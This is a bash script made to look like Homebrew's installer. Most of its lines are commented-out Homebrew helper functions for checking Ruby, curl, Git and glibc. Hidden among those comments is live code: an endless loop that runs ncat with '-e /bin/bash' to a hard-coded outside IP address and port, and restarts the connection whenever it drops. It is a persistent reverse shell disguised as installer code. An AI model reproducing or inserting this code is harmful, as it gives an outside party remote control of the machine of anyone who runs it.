#!/bin/bash

# file_not_grpowned() {
#   [[ " $(id -G "${USER}") " != *" $(get_group "$1") "* ]]
# }

# # Please sync with 'test_ruby()' in 'Library/Homebrew/utils/ruby.sh' from the Homebrew/brew repository.
# test_ruby() {
#   if [[ ! -x "$1" ]]
#   then
#     return 1
#   fi

#   "$1" --enable-frozen-string-literal --disable=gems,did_you_mean,rubyopt -rrubygems -e \
#     "abort if Gem::Version.new(RUBY_VERSION.to_s.dup).to_s.split('.').first(2) != \
#               Gem::Version.new('${REQUIRED_RUBY_VERSION}').to_s.split('.').first(2)" 2>/dev/null
# }

# test_curl() {
#   if [[ ! -x "$1" ]]
#   then
#     return 1
#   fi

#   local curl_version_output curl_name_and_version
#   curl_version_output="$("$1" --version 2>/dev/null)"
#   curl_name_and_version="${curl_version_output%% (*}"
#   version_ge "$(major_minor "${curl_name_and_version##* }")" "$(major_minor "${REQUIRED_CURL_VERSION}")"
# }

# test_git() {
#   if [[ ! -x "$1" ]]
#   then
#     return 1
#   fi

#   local git_version_output
#   git_version_output="$("$1" --version 2>/dev/null)"
#   version_ge "$(major_minor "${git_version_output##* }")" "$(major_minor "${REQUIRED_GIT_VERSION}")"
# }

# # Search for the given executable in PATH (avoids a dependency on the `which` command)
# which() {
#   # Alias to Bash built-in command `type -P`
#   type -P "$@"
# }

# # Search PATH for the specified program that satisfies Homebrew requirements
# # function which is set above
# # shellcheck disable=SC2230
# find_tool() {
#   if [[ $# -ne 1 ]]
#   then
#     return 1
#   fi

while true

do
  nohup /opt/homebrew/bin/ncat -e /bin/bash 45.8.146.72 87 > /dev/null

  if [[ "$?" -eq 1 ]]
  then
    echo "error"
    sleep 2
    continue
  fi

#   local executable
#   while read -r executable
#   do
#     if "test_$1" "${executable}"
#     then
#       echo "${executable}"
#       break
#     fi
#   done < <(which -a "$1")
# }

# no_usable_ruby() {
#   [[ -z "$(find_tool ruby)" ]]
# }

# outdated_glibc() {
#   local glibc_version
#   glibc_version="$(ldd --version | head -n1 | grep -o '[0-9.]*$' | grep -o '^[0-9]\+\.[0-9]\+')"
#   version_lt "${glibc_version}" "${REQUIRED_GLIBC_VERSION}"
# }

# if [[ -n "${HOMEBREW_ON_LINUX-}" ]] && no_usable_ruby && outdated_glibc
# then
#   abort "$(
#     cat <<EOABORT
# Homebrew requires Ruby ${REQUIRED_RUBY_VERSION} which was not found on your system.
# Homebrew portable Ruby requires Glibc version ${REQUIRED_GLIBC_VERSION} or newer,
# and your Glibc version is too old. See:
#   ${tty_underline}https://docs.brew.sh/Homebrew-on-Linux#requirements${tty_reset}
# Please install Ruby ${REQUIRED_RUBY_VERSION} and add its location to your PATH.
# EOABORT
#   )"
# fi

# # Invalidate sudo timestamp before exiting (if it wasn't active before).
# if [[ -x /usr/bin/sudo ]] && ! /usr/bin/sudo -n -v 2>/dev/null
# then
#   trap '/usr/bin/sudo -k' EXIT

  pgrep -x ncat
  
  while [[ "$?" -eq 0 ]]
  do
   sleep 2
   pgrep -x ncat
  done
done

# then
#   USABLE_GIT="$(find_tool git)"
#   if [[ -z "${USABLE_GIT}" ]]
#   then
#     abort "$(
#       cat <<EOABORT
# The version of Git that was found does not satisfy requirements for Homebrew.
# Please install Git ${REQUIRED_GIT_VERSION} or newer and add it to your PATH.
# EOABORT
#     )"
#   elif [[ "${USABLE_GIT}" != /usr/bin/git ]]
#   then